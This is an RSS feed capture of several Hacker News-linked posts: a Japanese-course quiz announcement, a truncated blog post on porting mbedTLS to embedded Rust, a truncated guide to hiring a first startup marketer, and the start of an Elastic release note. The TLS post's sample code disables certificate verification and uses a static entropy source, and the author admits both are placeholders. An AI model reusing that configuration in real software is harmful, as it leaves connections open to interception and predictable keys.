				<img width="1568" height="2366" src="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=1568" alt="" loading="lazy" srcset="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=1568 1568w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=99 99w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=199 199w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=768 768w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=679 679w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg 1603w" sizes="(max-width: 1568px) 100vw, 1568px" data-attachment-id="1208" data-permalink="https://learn-japanese.org/roadclay/" data-orig-file="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg" data-orig-size="1603,2419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="roadclay" data-image-description="" data-medium-file="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=199" data-large-file="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=679">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>At Japanese Complete we are hard at work inventing the present and the future for Japanese mastery, and now we have a daily cumulative quiz for our learners to take.</p>



<p>Japanese Complete is a curriculum designed on top of a frequency analysis of Japanese in the wild (the Balanced Corpus of Contemporary Written Japanese from 2011) and is assembled by experienced bilingual and trilingual teachers.</p>



<p>And now, learners take a cumulative quiz each day that is drawn from all the material they‚Äôve seen so far in Japanese Complete!  </p>



<figure><img loading="lazy" data-attachment-id="1202" data-permalink="https://learn-japanese.org/screen-shot-2020-09-24-at-11-08-31-am/" data-orig-file="https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png" data-orig-size="922,725" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screen-shot-2020-09-24-at-11.08.31-am" data-image-description="" data-medium-file="https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=300" data-large-file="https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=750" src="https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=922" alt="" width="465" height="365" srcset="https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=465 465w, https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=150 150w, https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=300 300w, https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png?w=768 768w, https://learnjapanesebest.files.wordpress.com/2020/09/screen-shot-2020-09-24-at-11.08.31-am.png 922w" sizes="(max-width: 465px) 100vw, 465px"><figcaption>Cumulative quizzes can be taken multiple times, but only count towards your streak once a day.</figcaption></figure>



<p>Now you can have a reason to do a quick review every day.  This goes along with our general advice of ‚Äúa little every day is better than a lot all at once.‚Äù  True for both meditation and language learning.</p>



<h2>What do the quizzes cover?</h2>



<p>Every chapter of Japanese Complete teaches new Kanji, Verbs, and Particles.   The quizzes cover all three groups and are based on our method of generous English Context (‚ÄúJapanese in English Context‚Äù) to help learners associate complex meaning structures with basic Japanese grammar, without needing to know lots of Japanese nouns.</p>



<p>In general, we find that our radical new approach to teaching Japanese based on frequency and grammar is incredibly good at bringing new learners up to speed and giving them ‚ÄúJapanese-eyes‚Äù for the language <strong>‚Äî</strong> hyper-recognition of particles, verbs, and a strong sense of familiarity and meaning with visited kanji.</p>



<p>You can read more about that at our seminal post <a href="https://learn-japanese.org/2019/10/10/habits-of-successful-language-learners/">‚ÄúHabits of Successful Language Learners‚Äù</a></p>



<figure><img data-attachment-id="1208" data-permalink="https://learn-japanese.org/roadclay/" data-orig-file="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg" data-orig-size="1603,2419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="roadclay" data-image-description="" data-medium-file="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=199" data-large-file="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=679" src="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=679" alt="" srcset="https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=679 679w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=1358 1358w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=99 99w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=199 199w, https://learnjapanesebest.files.wordpress.com/2020/09/roadclay.jpg?w=768 768w" sizes="(max-width: 679px) 100vw, 679px"><figcaption>At least Corona times provided amazing photo opportunities in otherwise crowded places‚Ä¶</figcaption></figure>



<p>To get a <strong>subscription</strong> to Japanese Complete <a href="https://japanesecomplete.com/purchase">please go to our main subscription page</a>.</p>



<p>If you‚Äôd like to check out our totally free <strong>guide</strong> to get your feet/eyes/ears wet with Japanese please receive it for free <a href="https://japanesecomplete.com/guide">here</a></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div><!-- #content -->

		<!-- #colophon -->

</div></div>]]>
            </description>
            <link>https://learn-japanese.org/2020/09/25/introducing-streaks-and-the-cumulative-quiz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589620</guid>
            <pubDate>Fri, 25 Sep 2020 13:45:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Down the Yak Hole of TLS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589608">thread link</a>) | @todsacerdoti
<br/>
September 25, 2020 | https://blog.drogue.io/yak-hole-of-tls/ | <a href="https://web.archive.org/web/*/https://blog.drogue.io/yak-hole-of-tls/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
  		<p>We've recently gotten TLS functional for embedded systems in Rust. 
TLS (Transport Layer Security) is one of the backbones to secure communications over TCP/IP, helping protect data in-flight between two parties.
There's a lot of moving parts involved in bringing easy-to-use functional cryptography to small 32-bit ARM Cortex-M devices. 
Let's dive in, shall we?</p>
<span id="continue-reading"></span>
<p><strong>Warning: This will be a long and winding blogpost. Grab a cup of coffee.</strong></p>

<p>One of the primary rules in cryptography is <em>never write your own cryptography</em>.
There's a lot of smart people already writing crypto libraries, and also a lot of smart people who are happy to poke holes in your hand-rolled crypto.</p>
<p>Thankfully, ARM has created <a href="https://tls.mbed.org/">mbedTLS</a> and donated it to <a href="https://www.trustedfirmware.org/">TrustedFirmware.org</a>.
That sounds perfect, yeah?</p>
<p>The downside of <em>mbedTLS</em> is that it's written in C, and is able to target not only embedded platforms, but also fully POSIX-compliance large host systems,
which means it is <em>highly configurable</em> and not immediately useful to Rust developers.</p>

<p>Rust <em>does</em> provide mechanisms for calling into libraries written in C. 
They are inherently <code>unsafe</code> because Rust, rightly, can't trust a library written in C to understand things like <em>lifetimes</em> and Rust's own memory model.</p>
<p>So normally, you find yourself with a <code>-sys</code> crate that simply builds the C library, and then wrap that with a Rust crate that provides better safety and semantics.</p>
<p>Then there's issues such as "Rust strings are valid UTF-8 and know their length" and "C strings are a sequence of bytes followed by a null", which complicates matters.</p>
<h2 id="the-drogue-tls-sys-crate">The <code>drogue-tls-sys</code> crate</h2>
<p>The first order of business is simply building the mbedTLS library, appropriately configured for an ARM Cortex-M embedded device which lacks things like filesystems, a real-time clock or <code>printf()</code>.</p>
<p>Everything configurable with mbedTLS is done through a <code>config.h</code> file they ship, defining or undefining a variety of macros which indicate what facilities your platform supports.</p>
<p>By telling mbedTLS that our platform doesn't support traditional things like <code>calloc(..)</code>/<code>free(...)</code> or <code>snprintf(...)</code>,  mbedTLS gives us a way to register function-pointers to those types of things for our platform.  <em>C function pointers</em>.</p>
<h3 id="let-s-look-at-calloc">Let's look at <code>calloc(...)</code></h3>
<p>Once we configure it, mbedTLS gives us this function:</p>
<pre><code><span>int </span><span>mbedtls_platform_set_calloc_free</span><span>( </span><span>void </span><span>* (*calloc_func)( size_t, size_t ),
                                      </span><span>void </span><span>(*free_func)( </span><span>void </span><span>* ) );
</span></code></pre>
<p>This allows us to register functions that behave as <code>calloc(...)</code> and <code>free(...)</code>, allocating and freeing memory on the heap.</p>
<p>By default, embedded Rust doesn't have a heap.</p>
<p>You can install an allocator to give you a heap, but then you also have to install an allocation error handler, which unfortunately is an unstable <em>nightly-only</em> feature of Rust.</p>
<p>How do we solve this?</p>
<p>We fork <a href="https://crates.io/crates/alloc-cortex-m">alloc-cortex-m</a>, and a bit of the Rust alloc crates <a href="https://github.com/drogue-iot/drogue-tls/tree/master/drogue-tls/src/platform">into our tree</a>.</p>
<p>The only reason we have to fork them is because using them directly triggers <code>rustc</code> into being convinced we have a global allocator and need to install the allocation error handler, which as noted above, is nightly-only.</p>
<h4 id="allocation-in-rust">Allocation in Rust</h4>
<p>Rust does allocation using a <code>Layout</code> which basically embodies the size of memory you request, along with adjustments for accomodate memory alignment for your platform.
Rust also wants the <em>exact same layout</em> passed in when you deallocate memory, unlike C's <code>free(...)</code> which only needs a pointer to the memory, because it put the layout information in a header of the initial allocation.</p>
<p>How do we solve that? The same way C does, by not expecting the caller to track the layout information, but by scribbling it into the start of the allocation ourselves, also.</p>
<p>If mbedTLS needs 16 bytes allocated, it'll call <code>calloc(1, 16)</code> to ask for 1 chunk of 16 bytes.</p>
<p>To that, we add 8 bytes for our book-keeping header, so the allocation will ultimately become 24 bytes. The extra 8 bytes track 2 <code>usize</code> slots for our book-keeping: 1 for the size of the allocation (24 bytes total) and one for the alignment requirements. Since our header takes the first 8 bytes, we return the pointer to the 9th byte, which starts the chunk of 16 bytes requested by the caller of <code>calloc(...)</code>.</p>
<pre><code><span>byte |0   |1   |2   |3   |4   |5   |6   |7   |8+
     |----|----|----|----|----|----|----|----|-----------------------
 use |alloc_size         |alignment          |handed back to caller  
</span></code></pre>
<p>When <code>free(...)</code> is called with only a pointer from C code, we back-track 8 bytes, read out the size and alignment values and rebuild our <code>Layout</code> to shuffle on into Rust's allocator's <code>dealloc(...)</code> method.</p>
<p>This allows us to avoid any external book-keeping, and just tacking an extra 8 bytes onto the head of each allocation.</p>
<h2 id="bindgen">Bindgen</h2>
<p>So far we've glossed over how we <em>actually</em> interface from Rust to C and back.</p>
<p>The answer is <a href="https://crates.io/crates/bindgen">bindgen</a>, which consumes C header files and produces <code>unsafe</code> Rust bindings to the API. </p>
<p>Since Rust has no concept of <code>null</code>, but C pointers can certainly be null, each pointer tends to get wrapped in a <code>Option</code> on the Rust side.</p>
<p>We can use the <code>extern "C"</code> syntax to write a function in Rust that can be called from C with the appropriate calling conventions. </p>
<pre><code><span>extern </span><span>"</span><span>C</span><span>" </span><span>fn </span><span>platform_calloc_f</span><span>(</span><span>count</span><span>: </span><span>usize</span><span>, </span><span>size</span><span>: </span><span>usize</span><span>) -&gt; </span><span>*mut</span><span> c_void {
  </span><span>// do the Layout and allocation dance described above
</span><span>}
</span></code></pre>
<p>Bindgen's processing of mbedTLS also provides us a Rust-callable function <code>platform_set_calloc_free(...)</code> exposed by mbedTLS. 
This is where we finally wire stuff up.
But, it's an <code>unsafe</code> function that takes function pointers as arguments, so we have to wrap the invocation of it in an <code>unsafe { ... }</code> block, and wrap our functions in an <code>Option::Some(...)</code>:</p>
<pre><code><span>unsafe </span><span>{ </span><span>platform_set_calloc_free</span><span>(Some(platform_calloc_f), Some(platform_free_f)) };
</span></code></pre>
<p>And now we've <em>finally</em> provided mbedTLS the ability to allocate and deallocate some heap-ish memory.</p>
<h2 id="variadics">Variadics</h2>
<p>When working with TLS and doing FFI in general, you need to be able to debug what's actually going on, particular in the two weeks you're banging your head on the table trying to figure out how it all works.
Just like <code>calloc(...)</code> above, mbedTLS allows you to pass in a debug logging function. 
The problem is that the things the debug logging function prints tend to be constructed using variants of <code>sprintf(...)</code>, which is a <em>variadic</em> function, meaning it can take an unlimited number of arguments to populate the formatting string.</p>
<p>For instance:</p>
<pre><code><span>printf</span><span>("</span><span>%s</span><span> says </span><span>%s %d</span><span> times</span><span>", bob_str, hi_str, </span><span>42</span><span>);
</span></code></pre>
<p>Would print out "Bob says Hi 42 times".</p>
<p>Stable Rust does not support variadics.</p>
<p>In our case, the two important methods are <code>snprintf(...)</code> which is a true variadic function, and <code>vsnprintf(...)</code> which is slightly less variadic, in that there's an argument that points to the remainder argument list.</p>
<p>It's trivial to write an implementation of <code>snprintf(...)</code> in C that delegates to <code>vsnprintf(...)</code> which <em>can</em> then be implemented, non-variadically, in Rust.</p>
<pre><code><span>extern int </span><span>snprintf</span><span>(</span><span>char </span><span>* </span><span>restrict </span><span>str</span><span>, size_t </span><span>size</span><span>, </span><span>const char </span><span>* </span><span>restrict </span><span>fmt</span><span>, ...) {
    va_list ap;
    </span><span>int</span><span> n;

    </span><span>va_start</span><span>(ap,fmt);
    n=</span><span>vsnprintf</span><span>(str,size,fmt,ap);
    </span><span>va_end</span><span>(ap);

    </span><span>return</span><span> n;
}
</span></code></pre>
<p>The <code>va_start(...)</code> macro ultimately populates the <code>ap</code> variable with a pointer to the arguments. 
The arguments are really viewed as an opaque blob of memory, so you must analyze the <code>printf</code> formatting string to know how to treat the bytes behind that pointer.</p>
<p>We've create the <a href="https://crates.io/crates/drogue-ffi-compat">drogue-ffi-compat</a> crate to help deal with that memory interpretation.</p>
<pre><code><span>#[</span><span>no_mangle</span><span>]
</span><span>pub extern </span><span>"</span><span>C</span><span>" </span><span>fn </span><span>vsnprintf</span><span>(
    </span><span>str</span><span>: </span><span>*mut u8</span><span>,
    </span><span>size</span><span>: </span><span>usize</span><span>,
    </span><span>format</span><span>: </span><span>*const u8</span><span>,
    </span><span>ap</span><span>: va_list,
) -&gt; </span><span>i32 </span><span>{
    </span><span>let mut</span><span> va_list = VaList::from(ap);
    </span><span>// use the Rust VaList now
</span><span>}
</span></code></pre>
<p>Now, if you process the <code>printf</code> formatting string and see a <code>%d</code> you know the next argument is an <code>i32</code> in Rust:</p>
<pre><code><span>let</span><span> value: </span><span>i32 </span><span>= va_list.va_arg::&lt;</span><span>i32</span><span>&gt;();
</span></code></pre>
<p>If it's followed by a <code>%c</code> you know you can safely interpret the following argument as a character:</p>
<pre><code><span>let</span><span> value: </span><span>char </span><span>= va_list.va_arg::&lt;</span><span>char</span><span>&gt;();
</span></code></pre>
<p>Of course, things will go woefully wrong if you don't have a <code>printf</code> formatting string to guide you through walking the <code>va_list</code> values.</p>
<p>The <code>drogue-ffi-compat</code> crate thankfully includes Just Enough printf formatting string processing to debug mbedTLS.</p>
<p>Just like registering our <code>calloc()</code> and <code>free()</code> implementation with mbedTLS, we can now register our <code>snprintf()</code> and <code>vsnprintf()</code> implementations the same way, using similar functions (not pictured, because yeesh, this is getting long).</p>

<p>The <a href="https://crates.io/crates/drogue-tls">drogue-tls</a> crate handily wraps up all the machinations above into a <em>safe</em> and more semantic API for dealing with TLS.
It provides an associated function to initialize the system and it sets up the debug logging, etc, and then provides a <code>TcpStack</code> for doing network operations.</p>

<p>Remember, we're doing this so we can put TLS on top of our TCP/IP connections.</p>
<p>If you recall from a <a href="https://blog.drogue.io/wifi-offload/">previous blogpost</a>, we have created a TCP stack based on using an ESP8266 over our USART. 
We're still doing that. 
But now we'll initialize the TLS platform and wrap it around that network stack to give us a secure network stack.</p>
<p>First, we initialize, providing a 48kb blob of memory for the heap-ish allocation.
We also set up a (terrible) entropy source (this needs to be improved) and see the random-number-generator (RNG):</p>
<pre><code><span>let mut</span><span> ssl_platform = SslPlatform::setup(
    cortex_m_rt::heap_start() as </span><span>usize</span><span>,
    </span><span>1024 </span><span>* </span><span>48</span><span>).</span><span>unwrap</span><span>();

ssl_platform.</span><span>entropy_context_mut</span><span>().</span><span>add_source</span><span>(StaticEntropySource);

ssl_platform.</span><span>seed_rng</span><span>().</span><span>unwrap</span><span>();
</span></code></pre>
<p>Once our previously-described underlying network stack is fired up and ready to rock, we can borrow it and build ourselves a secure network stack:</p>
<pre><code><span>let mut</span><span> ssl_config = ssl_platform.</span><span>new_client_config</span><span>(Transport::Stream, Preset::Default).</span><span>unwrap</span><span>();
ssl_config.</span><span>authmode</span><span>(Verify::None);

</span><span>// consume the config, take a non-mutable ref to the network.
</span><span>let</span><span> secure_network = SslTcpStack::new(ssl_config, &amp;network);
</span></code></pre>
<p>Note, we haven't enabled verification of authentication on the far end. Normally we would have some root Certificate Authority (CA) keys set up and ensure the far end of the ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.drogue.io/yak-hole-of-tls/">https://blog.drogue.io/yak-hole-of-tls/</a></em></p>]]>
            </description>
            <link>https://blog.drogue.io/yak-hole-of-tls/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589608</guid>
            <pubDate>Fri, 25 Sep 2020 13:45:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Choosing Your First Marketing Hire (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589572">thread link</a>) | @gk1
<br/>
September 25, 2020 | https://www.gkogan.co/blog/first-marketing-hire/?r=1 | <a href="https://web.archive.org/web/*/https://www.gkogan.co/blog/first-marketing-hire/?r=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>TL;DR - Your first marketing hire should probably be a director-level person who can be made accountable for generating a sales pipelines, with experience at a company 2-5x your size.</p>

<hr>

<p>In this article you‚Äôll learn to hire a great first marketer for your startup. It‚Äôs based on all the good and bad first marketing hires I‚Äôve witnessed at over a dozen enterprise software startups. (Surrounded by some of my cartoons, for added flavor.)</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/486438bbf79aa71853fb177b255c63e0923cfa97/a8afd/images/uploads/428.jpg" alt="Cartoon about a high-energy employee"></p>

<p>I wrote this guide because I often get asked by founders of B2B software startups for advice on hiring their first marketer. It‚Äôs not an easy task, because all marketers look the same to a technical founder, and the stakes are high, with pressure to get customers, increase revenue, and demonstrate an ability to grow both of those at a predictable and nonlinear rate.</p>

<p>What‚Äôs covered:</p>

<ol>
  <li><a href="#goals">Goals</a></li>
  <li><a href="#criteria">Key Criteria</a></li>
  <li><a href="#seniority">Seniority and the Strategy-Tactics Spectrum</a></li>
  <li><a href="#derisk">De-risking</a></li>
</ol>

<hr>


<h2 id="goals">Goals</h2>

<p>Let‚Äôs start with the goals of a first marketing hire:</p>

<ul>
  <li><strong>Pipeline</strong> - Assuming you‚Äôre past product-market-fit by the time you set out to hire your first marketer (recommended), the next most important thing becomes acquiring customers and gaining a foothold in the market.</li>
  <li><strong>Explore</strong> - Learn what strategies and tactics are effective for acquiring customers, and which ones aren‚Äôt. This will help allocate future resources with greater confidence and higher return, and is the first step to building a scalable process (flywheel).</li>
  <li><strong>Lay the foundation</strong> - Ensure the basics are in place: Messaging, a website that attracts and converts visitors into sales leads, basic funnel and attribution analytics, building a contact list, and so on. This will accelerate ramp-up and multiply the effect of future marketing projects and hires.</li>
  <li><strong>Free your time</strong> - Marketing is just another thing that takes up time you‚Äôd rather spend on the product, closing deals, supporting customers, and growing the company. A successful first marketing hire would free you to focus on those things.</li>
</ul>

<p>Those goals help shape the criteria and seniority of your ideal first marketing hire.</p>


<h2 id="key-criteria">Key Criteria</h2>

<p>Unless you have another reason to believe the person will be successful in their role‚Äîsuch as a trusted recommendation, or you know the person well‚Äîthen your first marketing hire <em>must</em> meet the following three criteria:</p>

<h3 id="1-growth-ownership">1. Growth Ownership</h3>

<p>The person must be capable and willing to be held accountable for growth of the company, as measured by concrete metrics such as growth rate and revenue (CMO/VP), or sales pipeline quality and volume (manager/director).</p>

<p>I‚Äôm not suggesting you tie compensation to these metrics; only that you make them a key responsibility and screening criteria for the role.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/61eb908c619ba3a7b75823c799f72e29260102b3/03448/images/uploads/432.jpg" alt="Cartoon about talent"></p>

<p>Reporting on these metrics is not the same as affecting them. Anyone can plug in Google Analytics or generate a Salesforce report to see lead quantities and ARR, but not everyone is capable of <em>doubling</em> those metrics or willing to be held accountable for it. Here‚Äôs why:</p>

<p>Marketers from large companies are insulated from growth metrics by the management layers above them. Their performance was measured by the amount of work completed, by their <em>department‚Äôs</em> performance, by distant downstream metrics (such as site traffic, blog readership, or search keyword rankings), or even by how their boss <em>thinks</em> they‚Äôre doing. To early stage startups these are vanity metrics; they look great but don‚Äôt make a meaningful difference.</p>

<p>Marketers from sales-centric companies might see their primary role as supporting the sales team and accelerating the sales cycle. They measure their performance by metrics such as the number of collateral materials they produce (eg, whitepapers, case studies) and consider it the sales department‚Äôs responsibility to close deals and grow revenue. This won‚Äôt fly at a startup where the length of sales cycles is a second-order concern.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/3527c9add26a07d9681a07e54f8c570536c03256/f35d8/images/uploads/447.jpg" alt="Cartoon about social media marketing"></p>

<p>Marketers with a more traditional background view their mission as increasing awareness in the market and conveying the ‚Äúright‚Äù message. They prioritize activities such as branding, communication, tradeshows, website designs, and social media. The value traditional marketers can add to an early stage software startup as a <em>first hire</em> is close to zero, regardless of their seniority. Communications and branding will help scale reach, but only after you have a decent customer base.</p>

<hr>

<p><em>By the way, I write an article like this every month or so, covering lessons learned from growing B2B software startups. Get an email update when the next one is published:</em>
<!-- Begin MailChimp Signup Form --></p>



<!--End mc_embed_signup-->
<hr>

<p>Lastly, some marketers want to join a startup for reasons other than taking on growth responsibility. For example, they might just want to get in on the ground floor, to experience the startup life, to have more freedom, or to work on a greater variety of projects. These people are neither prepared not expecting to take accountability for growth of the company.</p>

<p>Marketers with demand-generation experience (ie, demand-gen marketers) are good candidates because they‚Äôre used to having responsibility for pipeline metrics and they know some strategies and tactics to try.</p>

<h4 id="qualifications">Qualifications</h4>

<ul>
  <li>Ability to tie marketing projects to business objectives.</li>
  <li>Ownership of growth-related metrics.</li>
</ul>

<h4 id="interview-questions">Interview Questions</h4>

<ul>
  <li>What metrics are you responsible for at your current position?</li>
  <li>Tell me about one of your projects that made a big impact on growth?</li>
</ul>

<h3 id="2-ability-to-execute">2. Ability to Execute</h3>

<p>At this stage of the startup there isn‚Äôt much value in making long-term marketing plans, nor is there enough data to make good plans. Therefore, the first marketing hire must be able to create rough plans, execute them, and then iterate. That requires:</p>

<ul>
  <li>Bias for <em>action</em> over meticulous planning.</li>
  <li>Skills (or interest in learning) to run many different types of marketing campaigns.</li>
  <li>Experimental and analytical approach to marketing campaigns.</li>
</ul>

<p>One of my clients hired a head of marketing who spent their first three months crafting a 12-month marketing plan instead of actually <em>doing</em> anything. That‚Äôs three months of missed experiments, learning, and iterating. It also suggests they didn‚Äôt plan on learning anything then or in the next year that might alter the course. Months later the CEO saw behind the smokescreen, but it was a costly mistake that could have been avoided if the candidate was screened for ability to execute.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/75a77fbc5a934252260152f0ecc4ee313e0061ce/2751f/images/uploads/436.jpg" alt="Cartoon about poor performance"></p>

<p>One indicator that a person can execute is if their current/previous company is 2-5x the size of yours, either in headcount or revenue. You want somebody who‚Äôs been where you‚Äôre headed. They remember what the journey looks like and have an idea of how to repeat it, they‚Äôre accustomed to wearing multiple hats, and they can make do with slightly smaller budgets. If the gap is any larger than that‚Äîfor example, if you‚Äôre considering a marketer from a post-IPO company for your $2m ARR startup‚Äîthen they might turn out powerless without the resources and management structures they‚Äôre used to.</p>

<p>Some marketers, unfortunately, tout their experience running different campaigns when they really mean they have experience being an intermediary between their company and a <em>marketing agency</em> that ran those campaigns. You don‚Äôt want to realize too late that the marketing hire thought they‚Äôd have help from an agency when you didn‚Äôt plan or budget for that.</p>

<p>If you‚Äôre looking to hire a CMO or VP (more on that below) for their vision and direction and <em>not</em> for their hands-on abilities, they must still be able to execute in terms of building out an exceptional marketing team with the resources and runway available.</p>

<h4 id="qualifications-1">Qualifications</h4>

<ul>
  <li>Experience executing marketing campaigns at a company with X-Y employees/revenue.</li>
  <li>Ability to plan, execute, and iterate marketing campaigns at a rapid pace.</li>
  <li>Experimental and analytical approach to marketing campaigns.</li>
</ul>

<h4 id="interview-questions-1">Interview Questions</h4>

<ul>
  <li>What would you want to accomplish in the first 90 days, and how?</li>
  <li>Tell me about a campaign you took from idea to completion?</li>
  <li>Tell me about a campaign that failed, and what did you do?</li>
  <li>What resources would you need to be successful?</li>
</ul>

<h3 id="3-domain-knowledge">3. Domain Knowledge</h3>

<p>It‚Äôs important to have a marketer experienced with the domain you‚Äôre in, such as B2B, B2C, enterprise software, SaaS for SMB, consumer app, online media, etc. Enterprise buyers, mid-size companies, startups, SMBs, professionals, and consumers all make purchase decisions in different ways, so marketing tactics and strategies don‚Äôt always translate well between these markets. What works for a consumer-app startup might not work for an enterprise-software startup that has six-month sales cycles; what works for that enterprise software startup won‚Äôt work for an SMB SaaS that has lower customer lifetime values and therefore can‚Äôt survive with high acquisition costs.</p>

<p>You should also choose a marketer who can grok <em>or demonstrates the ability</em> to grok your product and target audience. They don‚Äôt need to know the product and audience inside-out on day one, but they should have a basic understanding right away and be able to gain a deep understanding within three months. Finding such a person is tough if your product is complex (eg, enterprise software) and your audience is marketing-averse (eg, engineers), but it‚Äôs <em>critical</em> if you want (and you do) to choose a first marketer who adds value instead of just being a coordinator or a people-person.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/d953a1bddd10f27a9975fd5835f15495d53dc8be/f62bf/images/uploads/people-skills.gif" alt="First marketing hire shouldn't just be a people-person."></p>

<h4 id="qualifications-2">Qualifications</h4>

<ul>
  <li>Experience driving growth in [B2B/B2C/SMB/‚Ä¶] markets.</li>
  <li>Domain knowledge of [industry/product/audience] space.</li>
</ul>

<h4 id="interview-questions-2">Interview Questions</h4>

<ul>
  <li>What‚Äôs your interest in the [industry] space?</li>
  <li>What company in the [industry] space do you think is doing marketing well, and why?</li>
</ul>


<h2 id="seniority-and-the-strategy-tactics-spectrum">Seniority and the Strategy-Tactics Spectrum</h2>

<p>Everyone says they can roll up their sleeves and do work. Not everyone can figure out the right work to do.</p>

<p>How do you ensure your first marketing hire does the right work to maximize growth? Do you start with a CMO, VP, director, manager, or specialist? The answer to both is finding someone balanced in strategic and tactical thinking.</p>

<p>Tactics are short-term ‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gkogan.co/blog/first-marketing-hire/?r=1">https://www.gkogan.co/blog/first-marketing-hire/?r=1</a></em></p>]]>
            </description>
            <link>https://www.gkogan.co/blog/first-marketing-hire/?r=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589572</guid>
            <pubDate>Fri, 25 Sep 2020 13:40:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elastic Enterprise Search 7.9: Free Workplace Search Features and Kibana Access]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589564">thread link</a>) | @gk1
<br/>
September 25, 2020 | https://www.elastic.co/blog/whats-new-elastic-enterprise-search-7-9-0-free-workplace-search-kibana-access | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/whats-new-elastic-enterprise-search-7-9-0-free-workplace-search-kibana-access">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>Exciting new enhancements in the <a href="https://www.elastic.co/blog/whats-new-in-elastic-7-9-0-free-workplace-search-engine-endpoint-security">7.9 release</a> of <a href="https://www.elastic.co/enterprise-search">Elastic Enterprise Search</a> make it easier than ever for you to offer powerful, modern search experiences for your app users, workplace teammates, and website visitors. Elastic Workplace Search features added to our free distribution tier provide you with a powerful starting point for empowering your teams with relevant information, even in the face of tightening budgets.
